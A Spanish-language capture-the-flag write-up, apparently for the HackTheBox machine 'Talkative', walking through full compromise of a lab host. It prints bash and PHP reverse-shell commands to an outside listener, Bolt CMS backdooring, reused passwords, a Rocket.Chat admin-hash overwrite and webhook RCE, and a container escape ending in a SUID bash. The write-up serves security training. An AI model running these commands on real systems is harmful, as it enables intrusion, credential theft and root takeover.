---
layout: post
title: "Resolución de Máquina: Talkative"
author: Husky
categories: [ htb ]
image: assets/images/htb/talkative/portada.png
tags: [ Pivoting, SSH, Linux, Web, MongoDB, Docker, Capability, Rocket.Chat, SSTI,  ]
---



### Máquina Linux con dificultad **Hard(Difícil)**, con temáticas de Pivoting de usuarios, explotación de Rj editor un plugin disponible en Jamovi, reutilización de credenciales, muchos contenedores, base de datos, y capabilities. 


... 


#### Clasificación de la Máquina según las Personas

<img src="/assets/images/htb/talkative/panel1.png" style="display: block; margin-left: auto; margin-right: auto; width: 50%;"/>

<img src="/assets/images/htb/talkative/panel.png" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

Bastante enumeración, tirando hacia la realidad con vulnerabilidades interesantes.


...


Como para omitirselo,¿No?...

1.  [Reconocimiento](#recon)

2.  [Enumeración Básica](#enum)

3.  [Explotación](#exploit)
  *   [Viendo que se esconde en el Puerto 8080](#puerto 8080)
  *   [Accediendo al panel de administrador](#puerto 80)

4.  [Escalada de Privilegio](#priv)
  *   [Rocket.chat](#rocket.chat)

#### Bien comenzemos!!!


...


## Reconocimiento[+](#recon) {#recon}

Empezamos con un escaneo tipico de puertos con nmap por TCP, ya que necesitamos información 

```bash
❯ nmap -p- -v 10.10.11.155
```

|Parámetros|Funcionalidad|
|:--|:--|
|-p-| Realiza escaneos en todos los puertos, los 65535 puertos |
|-v | Nos da más información mientras escanea los puertos |

Nos reporta que se ha encontrado 6 puertos:

| Puerto | Ocupación |
|:--|:--|
| 22 | <a href="https://www.hostinger.es/tutoriales/que-es-ssh" target="_blank">SSH</a>: Nos Permite el inicio de sesión con una terminal del equipo |
| 80 | <a href="https://www.ionos.es/digitalguide/hosting/cuestiones-tecnicas/protocolo-http/" target="_blank">HTTP</a>: Es un servidor web |
| 3000 | <a href="https://www.ibm.com/docs/es/i/7.2?topic=concepts-what-is-ppp" target="_blank">PPP</a>: Protocolo punto a punto de conxión que sirve para conectarse un sistema a otro |
| 8080 | <a href="https://www.ionos.es/digitalguide/hosting/cuestiones-tecnicas/protocolo-http/" target="_blank">HTTP</a>: Otro servidor web |

```bash
❯ nmap -p 22,80,3000,8080,8081,8082 -sCV 10.10.11.155
```

| Parámetros | Funcionalidad |
|:--|:--|
| -p | Realiza escaneos sobre los puertos dados |
| -sC | Lanza scripts básicos sobre los puertos |
| -sV | Permite revelar nombre o versión del servidor |


Dá mucha información sobre los puertos, pero en resumen:

|Puerto|Servicio|Observaciones|
|:--|:--|:--|
| 22 | SSH | Filtrado |
| 80 | HTTP | Apache httpd 2.4.52 |
| 3000 | PPP? |  En resumen: Rocket.Chat |
| 8080 | HTTP | Tornado httpd 5.0 |

El resto no nos serviran.


## Enumeración Básica[+](#enum) {#enum}

El puerto 80 hace un redireccionamineto a http://talkative.htb se esta aplicando Virtual Hosting.
> *El término Hosting Virtual se refiere a hacer funcionar más de un sitio web (tales como www.contoso.com y www.contoso2.com) en una sola máquina. Los sitios web virtuales pueden estar «basados en direcciones IP», lo que significa que cada sitio web tiene una dirección IP diferente, o «basados en nombres diferentes», lo que significa que con una sola dirección IP están funcionando sitios web con diferentes nombres (de dominio).*

<img src="/assets/images/htb/talkative/talkative16.png" style="display: block; margin-left: auto; margin-right: auto; width: 200%;"/>

# http://talkative.htb
<img src="/assets/images/htb/talkative/talkative1.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Mirando la página reporta el <a href="https://www.wappalyzer.com/" target="_blank">Wappalyzer</a> un CMS: bolt CMS

<img src="/assets/images/htb/talkative/talkative4.png" style="display: block; margin-left: auto; margin-right: auto; width: 50%;"/>

Investigando son encontramos con la <a href="https://docs.boltcms.io/5.0/manual/login#jumpbutton" target="_blank">documentacion de bolt CMS</a>, del cual tiene una ruta para login /bolt/

<img src="/assets/images/htb/talkative/talkative6.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Pero no disponemos de credenciales todavía, asi que..., luego la visitaremos

<img src="/assets/images/htb/talkative/talkative17.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Mirando la página vemos una seccion de personal y podemos ver sus respectivos correos de janit@talkative.htb, matt@talkative.htb, saul@talkative.htb

<img src="/assets/images/htb/talkative/talkative5.png" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>


## Página del puerto 8080 [+](#puerto 8080) {#puerto 8080}

En el puerto 8080 es un <a href="https://caminosaleatorios.wordpress.com/2019/01/09/acerca-de-jamovi/" terget="_blank">Jamovi</a>, si buscamos qué es, es un tipo excel o hoja de cálculo, con un modulo instalado de Rj Editor

<img src="/assets/images/htb/talkative/talkative3.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

> <a href="https://blogs.imf-formacion.com/blog/tecnologia/el-lenguaje-r-202012/" target="_blank">R</a> es un lenguaje de programacion que usa Rj Editor

<img src="/assets/images/htb/talkative/talkative7.png" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Por lo tanto, buscamos por <a href="https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/system" target="_blank">palabras clave</a> como system o command, vemos que se puede ejecutar **system('comando aqui' inten=TRUE)**

<img src="/assets/images/htb/talkative/talkative.png" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Y vemos que funciona!

<img src="/assets/images/htb/talkative/talkative8.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Puede interpretar comandos de Linux, asi que, **system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/6060 0>&1'")** el tipico comando de bash de entablar una consola inversa

Por nuestro lado nos abriremos un puerto en escucha para recibir la consola

```bash
❯ nc -nvlp 6060
```

Ya en escucha le damos, y nos da una consola interactive
```ruby 
> root@b06821bbda78:~#
```
Dentro de la máquina vemos que somos **root** pero tiene pocas cosas y es un contenedor..., vemos que en el directorio /root hay un archivo 'bolt-administration.omv', haciendo el comando 'file' vemos que es un archivo zip

```ruby
> root@b06821bbda78:~# file bolt-administration.omv
bolt-administration.omv: Zip archive data, at least v2.0 to extract, compression method=deflate
```

La máquina no tiene unzip asi que, tocará trasferirlo a nuestro equipo para descomprimir, una manera que se me ocurre es con el propio comando 'cat' 
```ruby
> root@b06821bbda78:~# cat bolt-administration.omv > /dev/tcp/0.0.0.0/6061
```
y en una terminal aparte escribir...

```bash
❯ nc -nvlp 6061 > bolt-administration.omv
```

Con md5sum bolt-administration.omv en ambos equipos, nos muerta un hash correspondiente a la data que almacena, nos sirve para ver si la data fue afectada o corrompida 

```bash
❯ md5sum bolt-administration.omv 
89a471297760280c51d7a48246f95628
```
Sin errores, pasamos a descomprimir el zip que contiene varias cositas entre ellas un archivo 'xdata.json' que contiene credenciales, los correos y contraseñas de algo, con una expresión filtramos por lo que nos interesa

```bash
❯ cat xdata.json | jq | grep false -B 1| grep -oP '".\*?"' | grep -vE 'Username|Password' | tr -d '"' > xdata.txt
❯ cat xdata.txt
matt@talkative.htb
janit@talkative.htb
saul@talkative.htb
jeO09ufhWD<s
bZ89h}V<S_DA
)SQWGm>9KHEA
```


## Accediendo al panel de Adminsitrador [+](#puerto 80) {puerot 80}

Recordando que en el puerto 80 hay un panel de autenticación podemos probar primero los usuarios y contraseñas pero nos toma las credenciales como incorrecta, buscando credenciales por defecto, logramos dar con el usuario *'admin@talkative.htb'*

Una vez conectado como administrador de la página, podemos modificar las estructuras de las páginas

En **configuratrion > all configuration files**,

<img src="/assets/images/htb/talkative/talkative19.png" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Podemos modificar un archivo del código fuente de la página y agregar un comando para darnos una consola interactiva de la máquina

<img src="/assets/images/htb/talkative/talkative18.png" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

Se ve tentador *bundle.php*, entonces le agregamos la siguente linea de comando en php:

```php
<?php

system('bash -c "bash -i >& /dev/tcp/10.10.14.10/6062 0>&1"');

...[snip]...
```
Le damos a *'save changes'* y con netcat nos ponemos en escucha por el puerto dado

Y al cargar la página principal son deberia dar una consola interactiva

```bash
❯ sudo nc -nlvp 6062
Connection from 10.10.11.155:34872
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
> www-data@adeece77920e:/var/www/talkative.htb/bolt/public$
```

Como siempre cualquier conexión con netcat, no estamos maniobrando sobre una TTY asi que hay que aplicarle un tratamiento:

```ruby
> www-data@adeece77920e:/var/www/talkative.htb/bolt/public$ script /dev/null -c bash
 <talkative.htb/bolt/public$ script /dev/null -c bash      
 Script started, output log file is '/dev/null'.
```
Hacemos *ctrl+z* para poner la conexión en segundo plano
```bash
❯ stty raw -echo; fg
[1]  + continued  sudo nc -nlvp 6062
                                    reset xterm
```
Para que se apliquen los cambios reiniciamos la consola

y todavía no estamos en la máquina real, seguimos en contenedores.

Despues de un buen rato revisando todo el contenedor, vemos que no es posible escalar privilegio en él pero si tenemos conectividad con la máquina real aqui

Como el contenedor no tiene el comando *'ping'* se puede usar el comando *'echo'*, y en base al código de estado final se puede saber si un puerto esta abierto o cerrado.

Podemos crear un pequeño script para ver que puerto esta abierto:
```ScanPort.sh
#!/bin/bash

for puerto in $(seq 1 65535) ;do
	bash -c "echo > /dev/tcp/10.10.11.155/$puerto" 2>/dev/null && echo "[+] Esta abierto el puerto $puerto"
done
```
Le damos permiso de ejecucion; 
```ruby
> www-data@adeece77920e:/tmp$ chmod +x ScanPort.sh
```
Y lo ejecutamos 
```ruby
> www-data@adeece77920e:/tmp$ ./ScanPort.sh
 [+] Esta abierto el puerto 22
 [+] Esta abierto el puerto 80
 [+] Esta abierto el puerto 8080
 [+] Esta abierto el puerto 8081
 [+] Esta abierto el puerto 8082
```

Veremos que el puerto 22 de la máquina real que esta abierdo desde este contenedor, y tiene el comando *'ssh'*, asi que podemos intertar conectarnos por ssh proporcionando las credenciales de los usuario con sus contraseñas

```ruby
www-data@e4803a9fde4b:/tmp$ ssh saul@10.10.11.155
The authenticity of host '10.10.11.155 (10.10.11.155)' can't be established.
ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
saul@10.10.11.155's password: jeO09ufhWD<s 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Sep 2022 04:34:14 AM UTC

  System load:                      0.1
  Usage of /:                       73.4% of 8.80GB
  Memory usage:                     77%
  Swap usage:                       17%
  Processes:                        407
  Users logged in:                  0
  IPv4 address for br-ea74c394a147: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.155
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:e89e


18 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
> saul@talkative:~$ 

```
**¡¡¡VAMOS!!!**, Ahora tocara escalar privilegios


## Escalada de Privilegio [+](#priv) {#priv}

Dando vueltas por el sistema, nos percatamos que no hay una posible acceso como el usuario **root**

Asi que, vamos a escribir un script que muestra en pantalla los comandos ejecutados a intervalos regulares de tiempo par asi se esta ejecutando una tarea con la que abusar para escalar privilegios:

```ScanProc.sh
#!/bin/bash ScanProc.sh

new="$(ps -eo command)"

while true;do 
        old="$(ps -eo command)"
        diff <(echo "$new") <(echo "$old")|grep "[\>\<]" | grep -vE "ScanProc|command|kworker"
        new=$old❯
done

```

Le damos permiso de ejecución, y con paciencia, esperamos a algun comando...


```ruby
> saul@talkative:/tmp$ chmod +x ScanProc.sh
> saul@talkative:/tmp$ ./ScanProc.sh 
 >/usr/sbin/CRON -f
 >\>/bin/sh -c python3 /root/.backup/update_mongo.py
 >\>python3 /root/.backup/update_mongo.py

```

Despues de un tiempo, podemos ver un proceso que esta ejecutando root, *update_mongo.py*

### ¿Qué es MongoDB?

#### MongoDB es una base de datos de documentos que ofrece una gran escalabilidad y flexibilidad, y un modelo de consultas e indexación avanzado.

Ehm...bueno...

Informandonos de mongo vemos que se maneja por defecto ocupando el puerto 27017, haciando el comando *'netstat -nat'* vemos que esta en un contener ejecutandose

```ruby
> saul@talkative:/tmp$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
...[snip]...   
tcp        0      0 172.17.0.1:49052        172.17.0.2:27017        TIME_WAIT  
tcp        0      0 172.17.0.1:49054        172.17.0.2:27017        TIME_WAIT  
...[snip]...
```

Nos podemos traer ese puerto como local con chisel

La máquina tiene conectividad con nuestro equpio asi que podemos hacer que descargue el chisel, nos montamos un servidor simple para ofrecer el chisel


```ruby
> saul@talkative:/tmp$ wget http://10.10.14.10/chisel
> saul@talkative:/tmp$ chmod +x chisel
```

Nuestro equipo debe iniciar el promagra como servidor y la máquina como cliente para poder tener su puerto 27017

```bash
❯ ./chisel server -reverse --host 10.10.14.10 --port 1234
```

```ruby
> saul@talkative.htb:/tmp$ ./chisel client 10.10.14.10:1234 R:27017:172.17.0.2:27017
```

Una vez conectado al puerto con mongosh podemos entrar en la base de datos 


```ruby
> mongosh
Current Mongosh Log ID:	631823c4f328877a7dc098e5
Connecting to:		mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+1.5.4
Using MongoDB:		4.0.26
Using Mongosh:		1.5.4

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

------
   The server generated these startup warnings when booting
   2022-09-06T05:25:37.479+0000: 
   2022-09-06T05:25:37.479+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2022-09-06T05:25:37.479+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2022-09-06T05:25:44.166+0000: 
   2022-09-06T05:25:44.166+0000: ** WARNING: Access control is not enabled for the database.
   2022-09-06T05:25:44.166+0000: **          Read and write access to data and configuration is unrestricted.
   2022-09-06T05:25:44.166+0000:
------

------
   Enable MongoDB's free cloud-based monitoring service, which will then receive and display
   metrics about your deployment (disk utilization, CPU, operation statistics, etc).
   
   The monitoring data will be available on a MongoDB website with a unique URL accessible to you
   and anyone you share the URL with. MongoDB may use this information to make product
   improvements and to suggest MongoDB products and deployment options to you.
   
   To enable free monitoring, run the following command: db.enableFreeMonitoring()
   To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
------

> rs0 [direct: primary] test>
```

### Rocket.chat [+](#rocket.chat) {#rocket.chat}

Buscando entre la base de datos, podemos ver en la base de datos *'meteor'* hay un tabla *'users'* y un usuario *'saul'* asignado con *'roles: admin'* y una contraseña cifrada en bcrypt, podemos crackear la contraseña cifrada o, ya que podemos manipular la base de datos podemons cambiar la contraseña y  buscando por cambiar la contraseña del administrador nos sale un el <a href="https://docs.rocket.chat/guides/administration/admin-panel/advanced-admin-settings/restoring-an-admin" target="_blank">documento de rocket.chat</a> para cambiar la contraseña via la mongodb

Por el puerto 3000 esta Rocket.chat, asi que...

<img src="/assets/images/htb/talkative/talkative2.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Hay que reemplazar la palabra 'administrador' por 'admin' ya que ese es el nombre de usuario


```ruby
> rs0 [direct: primary] meteor> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
DeprecationWarning: Collection.update() is deprecated. Use updateOne, updateMany, or bulkWrite.
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 1,
  upsertedCount: 0
}
```

Esto hara que la contraseña del administrador cambie a '12345'.

Accedemos con el usuario saul@talkative.htb y la contraseña 12345.

<img src="/assets/images/htb/talkative/talkative20.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Ahora como administrador de la página podemos buscar por vulnerabilidades de forma autenticada.

<img src="/assets/images/htb/talkative/talkative9.png" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

Sigun el procedimiento del compañero <a href="https://github.com/CsEnox/CVE-2021-22911?ysclid=l7r5s1ehbk302401550" target="_blank">CsEnox</a> , la explotación va por una funcionalidad llamada **'integrations'**, tendremos que creamos un nuevo <a href="https://www.activecampaign.com/es/blog/que-es-webhook" target="_blank">WebHook</a>

<img src="/assets/images/htb/talkative/talkative10.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

<img src="/assets/images/htb/talkative/talkative12.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Le asignamos un canal y a un usuario, y en script lo habilitamos y pegamos el script.

<img src="/assets/images/htb/talkative/talkative15.png" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

Le damos a *'Save Changes'*, y volvemos para atras, y nos ha creado un nuevo WebHook
<img src="/assets/images/htb/talkative/talkative13.png" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

Al final son da una URL para conectarnos al WebHook
<img src="/assets/images/htb/talkative/talkative14.png" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>


```bash
❯ curl http://10.10.11.155:3000/hooks/ggmD6mCoknDtQaw5n/FfRD3vibuiaBmyrrDT6CdYqH8eLCqgB2jq8J4oeCNDTCuabA
```

En una consola aparte nos ponemos en escuda por el puerto 6062 con netcat para recibir la consola interactiva


```bash
❯ sudo nc -nlvp 6063
Connection from 10.10.11.155:58552
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
> root@c150397ccd63:/app/bundle/programs/server#
``` 

Y nuevamente estamos en un contenedor, ya suficiente de contenedores, busquemos la forma de escapar de este contenedor.
Viendo por <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#automatic-enumeration-and-escape" target="_blank">HackTricks - Dockerbreakout</a>, hay una herramienta <a href="https://github.com/cdk-team/CDK#installationdelivery" target="_blank">CDK</a> que nos permite escanear posibles escapatorias de un contenedor.

Para transferir el binario, lo podemos hacer con cat y netcat, pero para ello necesitamos manejarnos por una TTY.
```ruby
> root@c150397ccd63:~# script /dev/null -c bash                
script /dev/null -c bash
Script started, file is /dev/null
> root@c150397ccd63:~#
```

Le damos a 'ctrl+z'

```ruby
❯ stty raw -echo;fg
[1]  + continued  sudo nc -nlvp 6063
                                    reset xterm
```

Y ahora si podemos transferir el archivo, nos ponemos en escucha por algun puerto libre y que al conectarse ofresca el binario

```bash
❯ nc -nvlp 6064 < cdk
```

Haciendo lo mismo que antes, pero en vez de que nosotros lo recibamos lo recibira la máquina

```ruby
> root@c150397ccd63:~# cat < /dev/tcp/10.10.14.158/6064 > cdk
```

Esperamos un poco para que se trasnfiera sin errores, y luego presionamos ctrl+c para forzar una salida no exitosa.

Comprobamos que el hash md5 sean identicos para saber si la data a sido manipulada o alterada en el proceso, y le damos permiso de ejecución

```ruby
> root@c150397ccd63:~# md5sum cdk 
6faa6f0103f8c46a54d0fa80f00ee74a  cdk
> root@c150397ccd63:~# chmod +x cdk
> root@c150397ccd63:~# ./cdk
> CDK (Container DucK)
CDK Version(GitCommit): 548ef65dd14313a27c2bef15b7d1bff57bf6a98c
Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy & neargle
Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/wiki

Usage:
  cdk evaluate [--full]
  cdk eva [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk auto-escape <cmd>
  cdk <tool> [<args>...]

Evaluate:
  cdk evaluate                              Gather information to find weakness inside container.
  cdk eva                                   Alias of "cdk evaluate".
  cdk evaluate --full                       Enable file scan during information gathering.


Exploit:
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.

Tool:
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

Options:
  -h --help     Show this help msg.
  -v --version  Show version.
```

Vemos una opción que nos permite obtener información acerca de posibles vulnerabilidades

```ruby
> root@c150397ccd63:~# ./cdk eva --full
...[snip]...
[*] Maybe you can exploit the Capabilities below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
...[snip]...
```
Encontro una <a href="https://www.incibe-cert.es/blog/linux-capabilities" target="_blank">Capability</a> que nos permite leer archivos de la máquina real como root 

O explotar un fallo en esa Capability que nos podemos traer el sistema entero de la maquina real, haciendo '/etc/host /' nos permite acceder desde el contenedor como root con un pequeño fallo visual que es el nombre del hostname.

```ruby
> root@c150397ccd63:~# ./cdk run cap-dac-read-search /etc/hosts /
Running with target: /, ref: /etc/hosts
executing command(/bin/bash)...
> root@c150397ccd63:/#
```

Y por magia del hacking estamos en la máquina real como root aunque no lo parezca, debido a que la Capability ejecuta 'chdir' como el host es root en la raíz '/' y nos da una consola interactiva desde Bash
 
Para asegurarnos que estamos en la máquina real le asignamos privilegio SUID a la bash para ganar acceso desde saul


```ruby
> root@c150397ccd63:/# chmod u+s /bin/bash

```

Y ahora con saul nos podemos ejecutar la bash -p para que nos de la bash como el propietario.


```ruby
> saul@talkative:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
> saul@talkative:~$ bash -p
> bash-5.0# whoami
root

```

